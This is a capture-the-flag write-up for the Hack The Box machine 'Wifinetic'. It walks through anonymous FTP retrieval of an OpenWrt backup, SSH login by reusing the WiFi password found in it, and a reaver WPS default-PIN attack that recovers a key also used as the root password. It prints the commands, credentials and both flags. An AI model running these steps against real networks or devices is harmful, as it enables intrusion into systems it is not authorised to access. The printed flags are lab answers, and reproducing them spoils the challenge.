---
tags:
  - ctf
  - hbwj
platform: htb
os: linux
solved: true
solved_by_wj: true

---
# Wifinetic - CTF Writeup

## Overview

- **Attack Path**: FTP Anonymous Access → OpenWRT Backup Analysis → SSH Access → WPS PIN Attack → Root

## Enumeration

Initial nmap scan revealed minimal attack surface:

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9
53/tcp open  domain  (generic dns response: SERVFAIL)
```

The FTP service allowed anonymous access with several interesting files:

- `backup-OpenWrt-2023-07-26.tar` - OpenWRT configuration backup
- `MigrateOpenWrt.txt` - Migration documentation
- `ProjectGreatMigration.pdf` - Project documentation

## Initial Foothold

### Vulnerability: Information Disclosure via Anonymous FTP

Downloaded and extracted the OpenWRT backup:

```bash
ftp 10.10.11.247
ftp> anonymous
ftp> binary
ftp> get backup-OpenWrt-2023-07-26.tar
ftp> quit
tar -xf backup-OpenWrt-2023-07-26.tar
```

Found WiFi credentials in `etc/config/wireless`:

```text
option key 'VeRyUniUqWiFIPasswrd1!'
```

Found username in `etc/passwd`:

```text
netadmin:x:1000:1000::/home/netadmin:/bin/bash
```

Successfully authenticated to SSH:

```bash
ssh netadmin@10.10.11.247
Password: VeRyUniUqWiFIPasswrd1!
```

**User Flag**: `13316f233a4285fa3d271424bc580a8f`

## Privilege Escalation

### Vulnerability: WPS PIN Default Configuration

System enumeration revealed:

- Multiple wireless interfaces (wlan0, wlan1, wlan2, mon0)
- `reaver` tool with `cap_net_raw+ep` capability
- `hostapd` and `wpa_supplicant` running as root
- WiFi-themed environment suggesting WPS exploitation

The `reaver` tool supports command execution with `-C` flag upon successful PIN recovery:

```bash
reaver --help
...
-C, --exec=<command>  Execute the supplied command upon successful pin recovery
```

Discovered the WPS PIN was the common default `12345670`. Used reaver to recover the WPA PSK:

```bash
reaver -i mon0 -b 02:00:00:00:00:00 -vv -p 12345670 -C "id"
[+] Pin cracked in 1 seconds
[+] WPS PIN: '12345670'
[+] WPA PSK: 'WhatIsRealAnDWhAtIsNot51121!'
```

The recovered WPA PSK was actually the root password:

```bash
su - root
Password: WhatIsRealAnDWhAtIsNot51121!
root@wifinetic:~# id
uid=0(root) gid=0(root) groups=0(root)
```

**Root Flag**: `5fe82a18d60a77baf181b3ddb2b55116`

## Lessons Learned

1. **Password Reuse**: The system demonstrated multiple instances of password reuse - the WiFi password from the backup worked for SSH, and the WPA PSK worked for root
2. **Default Configurations**: The WPS PIN was left at the common default value of 12345670
3. **Information Disclosure**: Anonymous FTP access with sensitive backup files provided the initial foothold
4. **Capability Abuse**: While reaver's cap_net_raw capability seemed like an exploitation vector, the actual path was simpler - using reaver's intended functionality to recover credentials
5. **CTF Theme Hints**: The WiFi/wireless theme strongly hinted at the privilege escalation vector involving WPS/reaver